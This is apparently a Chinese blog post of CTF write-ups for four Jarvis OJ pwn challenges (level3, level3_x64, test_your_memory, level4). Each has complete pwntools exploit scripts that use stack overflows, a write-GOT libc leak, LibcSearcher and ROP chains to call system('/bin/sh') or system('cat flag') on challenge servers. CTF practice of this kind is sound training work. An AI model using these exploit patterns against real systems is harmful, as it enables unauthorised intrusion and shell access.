---
layout: w
title: Jarvis oj
date: 2019-12-12 00:11:54
tags: pwn
---
<!-- more -->
# 0x01 level3
该题和CTF-wiki的ret2libc3基本相似，但是用的另一种泄露libc的方法  
首先就是常用套路，先运行看一下，然后检查保护，然后 IDA 看  
![](Image.png)  
![](level3_2.png)  
![](level3_3.png)  
![](level3_4.png)  
很明显在 vul 函数中存在栈溢出漏洞，接下来用 cyclic 测试溢出长度
![](level3_5.png)
![](level3_6.png)  
可以看到溢出长度是140，那么我们看一下有没有关键函数或关键字符串，在此用了elf.symbols，ROPgadget等工具发现并没有system以及/bin/sh字符串，然后想到WIKI中的ret2libc3，但是题目并没有给出libc，那么就泄露libc，我们发现程序中存在write函数，我们用write函数来泄露libc，并使用libc中的system 函数和/bin/sh的字符串  
泄露过程如下:
```python
from pwn import*   
context.log_level='debug'   
p=remote('pwn2.jarvisoj.com',9879)  
#p=process('./level3')  
#p=remote('120.79.1.69',10000)  
elf=ELF('./level3')  
write_plt = elf.plt['write']  
write_got = elf.got['write']   
p.recvuntil("Input:\n")  
p.sendline("a"*140+p32(write_plt)+p32(0xdeadbeef)+p32(1)+p32(write_got)+p32(4))  
``` 

一开始没有加 p.recvuntil("Input:\n")  
导致泄露的地址一直是错误的，错误地址如下：
![](level3_7.png)  
一直找不到原因，后面请教大佬说我的位置找错了，思考并看了一下别的exp，大佬说应该是这个位置
![](level3_8.png)  
于是知道了应该要加上p.recvuntil("Input:\n")  
泄露成功  
![](level3_9.png)  
然后利用Libcsearcher计算偏移以及得到system函数和/bin/sh的地址，因为Libcsearcher也是刚开始用，讲不了很详细，都是百度来的方法，这里要提一点，泄露地址的payload的返回地址要写main函数的地址，否则payload打过去一次就结束了，写main函数的地址目的是为了打完一次再重头来一次。   
直接贴出exp:     
```Python
from pwn import*
from LibcSearcher import*

context.log_level='debug'
p=remote('pwn2.jarvisoj.com',9879)
p=process('./level3')
#p=remote('node3.buuoj.cn',28111)
elf=ELF('./level3')

write_plt = elf.plt['write']
write_got = elf.got['write']
main_addr = elf.symbols['main']
p.recvuntil("Input:\n")
p.sendline("a"*140+p32(write_plt)+p32(main_addr)+p32(0x1)+p32(write_got)+p32(0x4))

write_addr = u32(p.recv(4))
print hex(write_addr)

libc = LibcSearcher('write', write_addr)
offset = write_addr - libc.dump('write')
system_addr = offset + libc.dump('system')
binsh_addr = offset + libc.dump('str_bin_sh')

payload2 = 'a' * 140 + p32(system_addr) + p32(0xdeadbeef) + p32(binsh_addr)

p.send(payload2)
p.interactive()
```    
# 0x02 level3_x64  
和上一题最大的不同就是寄存器传参   
```Python
# coding=utf-8
from pwn import*
#p=process("./level3_x64")
p=remote("pwn2.jarvisoj.com",9883)
context.log_level = 'debug'
elf=ELF("./level3_x64")
libc = ELF("libc-2.19.so")
pop_rdi_ret = 0x00000000004006b3
pop_rsi_r15_ret = 0x00000000004006b1
write_plt = elf.plt['write'] 
write_got = elf.got['write']
vul = elf.symbols['vulnerable_function']
padding = "\x00"*136
==========================leak addr===============================
payload1 = padding + p64(pop_rdi_ret) + p64(1) + p64(pop_rsi_r15_ret) + p64(write_got) + p64(0) + p64(write_plt) + p64(vul)   #这里因为没有单独的pop_rsi_ret,所以要在r15中放一个垃圾值
p.recvuntil("Input:\n")
p.send(payload1)
write_addr = u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00'))
log.success("write_addr = " + hex(write_addr))
offset = write_addr - libc.symbols['write']
sys_addr = offset + libc.symbols['system']
log.success("system_addr = " + hex(sys_addr))
binsh_addr = offset + libc.search("/bin/sh").next()
log.success("binsh_addr = " + hex(binsh_addr))
==========================getshell================================
payload2 = padding + p64(pop_rdi_ret) + p64(binsh_addr) + p64(sys_addr)
p.sendline(payload2)
p.interactive()
```  

# 0x03 test_your_memory  

这题就是直接溢出然后覆盖返回地址为程序中已有的system函数和参数"cat flag"，控制程序指向system("cat flag")，很奇怪的就是不知道为什么返回地址一定要是程序里有的地址，填0x12345678或者0xdeadbeef这样的地址就会直接EOF..
```Python
from pwn import*
context.log_level = 'debug'
context.terminal = ['terminator','-x','sh','-c']
#p=remote("pwn2.jarvisoj.com",9876)
elf = ELF("./memory")
p=process("./memory")

ret = 0x080483de
padding = "a"*0x13 + "aaaa"
payload = padding + p32(0x80485BD) + p32(ret) + p32(0x80487e0)
p.send(payload)

p.interactive()
```  

# 0x04 level4   
  
```python   
#!/usr/bin/env python2
#conding=utf-8
from pwn import *
from LibcSearcher import *
p=remote("pwn2.jarvisoj.com",9880)
context.log_level = 'debug'
#p=process("./level4")
elf = ELF("./level4")

write_plt = elf.plt["write"]
write_got = elf.got["write"]
main_addr = elf.symbols["main"]
payload = "a"*140 + p32(write_plt)+p32(main_addr)+p32(0x1)+p32(write_got)+p32(0x4)
p.send(payload)

write_addr = u32(p.recv(4))
print hex(write_addr)
libc = LibcSearcher('write',write_addr)
offset = write_addr - libc.dump('write')
print hex(offset)
sys_addr = offset + libc.dump('system')
print hex(sys_addr)
binsh_addr = offset + libc.dump("str_bin_sh")
print hex(binsh_addr)

payload2 = "a"*140 + p32(sys_addr) + p32(0xdeadbeef) + p32(binsh_addr)
p.send(payload2)
p.interactive()
```  
